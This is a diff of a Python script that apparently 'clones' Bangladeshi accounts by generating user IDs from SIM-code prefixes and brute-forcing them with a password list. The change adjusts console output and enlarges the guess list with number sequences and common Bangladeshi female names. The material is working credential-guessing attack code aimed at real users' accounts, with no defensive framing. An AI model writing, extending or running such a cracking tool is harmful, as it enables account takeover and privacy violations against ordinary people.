@@ -221,7 +221,7 @@ def virusA():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print(" ┏━[•] BD SIM CODE 017 018 019 013 015 016]")
+	print(" ┏━[•] BD SIM CODE : 017 018 019 013 015 016]")
 	kode = input(' ┗━[+] SELECT : ')
 	doamin = ' BD Number id cloner [ONLY-OK] '
 	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
@@ -236,13 +236,13 @@ def virusA():
 		print(logo)
 		tl = str(len(user))
 		print('┏━[•] COUNTRY    : Bangladesh')
-		print('┣━[•] TOTAL ID   :  '+tl)
-		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
-		print('\033[1;97m┗━[•] \033[1;92mSTART BD NAMBER MIXT CRACKING... ')
+		print('┣━[•] TOTAL ID   : '+tl)
+		print(f'┣━[•] SIM CODE   : \033[1;92m{kode}')
+		print('\033[1;97m┗━[•] \033[1;92mRUNNING BD NAMBER MIXT CRACKING... ')
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','102030','203040','304050','405060','506070','607080','708090','jannat','Jannat','nusrat','Nusrat','sadiya','Sadiya','sumaiya','Sumaiya','fariya','Fariya','jannatul','Jannatul','Mimmim','mimmim']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
